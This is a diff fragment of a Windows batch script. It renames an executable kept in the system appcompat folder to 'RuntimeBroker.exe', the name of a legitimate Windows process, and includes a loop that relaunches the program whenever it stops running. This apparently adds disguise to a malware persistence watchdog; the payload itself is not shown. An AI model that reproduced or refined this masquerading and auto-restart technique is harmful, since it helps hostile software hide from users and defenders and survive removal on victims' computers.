@@ -1,6 +1,6 @@
 @echo off
 cls
-set "AvloPath=%SYSTEMROOT%\appcompat\Retard.exe"
+set "AvloPath=%SYSTEMROOT%\appcompat\RuntimeBroker.exe"
 set "AvloDir=%SYSTEMROOT%\appcompat"
 
 :SCHECK
@@ -12,7 +12,7 @@ if not exist "%AVLOPATH%" (
 
 :MAINTAIN
 if not exist "%AVLOPATH%" goto CREATE
-tasklist | find /I "Retard.exe" >nul 2>&1
+tasklist | find /I "RuntimeBroker.exe" >nul 2>&1
 if "%ERRORLEVEL%"=="1" Start %AVLOPATH%
 
 :CREATE
